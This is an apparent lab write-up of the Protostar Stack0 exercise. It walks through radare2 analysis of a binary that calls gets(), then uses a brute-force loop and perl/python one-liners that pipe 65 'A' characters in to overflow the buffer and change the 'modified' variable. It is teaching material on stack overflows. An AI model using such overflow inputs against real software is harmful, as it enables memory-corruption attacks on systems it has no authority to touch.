# Protostar Stack0
## Write-up plan
 - [x] Use Radare2 to identify what C APIs were used
 - [x] Run the vulnerable code
 - [x] Try a simple Brute Force script
 - [x] Attach a Debugger to understand what was happening
 - [x] Read the Code to check my results


## Static Analysis
##### Open and analyse the binary
`r2 -A stack0`
##### Familiarity
```
[0x1000015f0]> i
file     stack0
format   elf
type     EXEC (Executable file)
arch     x86
canary   false
crypto   false
endian   little
lang     c
os       linux
pic      false
static   false
stripped false
.....
```
##### Imports
```
[0x080483f4]> ii
[Imports]
   1 0x080482fc    WEAK  NOTYPE __gmon_start__
   2 0x0804830c  GLOBAL    FUNC gets
   3 0x0804831c  GLOBAL    FUNC __libc_start_main
   4 0x0804832c  GLOBAL    FUNC puts
```

#####  gets
This is what `man gets` tells you:


> The gets() function cannot be used securely.  Because
>      of its lack of bounds checking, and the inability for
>      the calling program to reliably determine the length
>      of the next incoming line, the use of this function
>      enables malicious users to arbitrarily change a run-
>      ning program's functionality through a buffer over-
>      flow attack.

##### Exports
```
[0x08048340]> iE
066 0x000003f4 0x080483f4 GLOBAL   FUNC   65 main
```
##### Look for interesting Strings
```
fs strings; f
0x08048500 41 str.you_have_changed_the__modified__variable
0x08048529 11 str.Try_again
```
##### Print disassembled function
```
[0x08048340]> pdf @0x080483f4
/ (fcn) main 65
|   main ();
|           ; var char *s @ esp+0x1c
|           ; var int local_5ch @ esp+0x5c
|           ; DATA XREF from entry0 (0x8048357)
|           0x080483f4      55             push ebp
|           0x080483f5      89e5           mov ebp, esp
|           0x080483f7      83e4f0         and esp, 0xfffffff0
|           0x080483fa      83ec60         sub esp, 0x60               ; '`'
|           0x080483fd      c744245c0000.  mov dword [local_5ch], 0
|           0x08048405      8d44241c       lea eax, [s]                ; 0x1c ; 28
|           0x08048409      890424         mov dword [esp], eax        ; char *s
|           0x0804840c      e8fbfeffff     call sym.imp.gets           ; char *gets(char *s)
|           0x08048411      8b44245c       mov eax, dword [local_5ch]  ; [0x5c:4]=-1 ; '\' ; 92
|           0x08048415      85c0           test eax, eax
|       ,=< 0x08048417      740e           je 0x8048427
|       |   0x08048419      c70424008504.  mov dword [esp], str.you_have_changed_the__modified__variable ; [0x8048500:4]=0x20756f79 ; "you have changed the 'modified' variable" ; const char *s
|       |   0x08048420      e807ffffff     call sym.imp.puts           ; int puts(const char *s)
|      ,==< 0x08048425      eb0c           jmp 0x8048433
|      ||   ; CODE XREF from main (0x8048417)
|      |`-> 0x08048427      c70424298504.  mov dword [esp], str.Try_again ; [0x8048529:4]=0x20797254 ; "Try again?" ; const char *s
|      |    0x0804842e      e8f9feffff     call sym.imp.puts           ; int puts(const char *s)
|      |    ; CODE XREF from main (0x8048425)
|      `--> 0x08048433      c9             leave
\           0x08048434      c3             ret
```

## Run vulnerable code
```
$ ./stack0      
ss
Try again?
```
## Brute Force vulnerable code
```
#!/bin/bash
for i in {1..70}
do
 seq -sA $i|tr -d '[:digit:]' | ./stack0
done
```
### Use codetools
```
$ perl -e 'print "A"x65'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | /opt/protostar/bin/stack0
you have changed the 'modified' variable

$ python -c 'print "A"*(64)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ python -c 'print "A"*(64)' | /opt/protostar/bin/stack0
Try again?

$ python -c 'print "A"*(65)' | /opt/protostar/bin/stack0
you have changed the 'modified' variable
```

## Run vulnerable code in debugger
```
(gdb) r
Starting program: /opt/protostar/bin/stack0
a
Try again?

Program exited with code 013.
```


### Convert Hex to Decimal
```
$ printf "%02X\n" 65
41

$ printf "%d\n" 0x5C
92
```
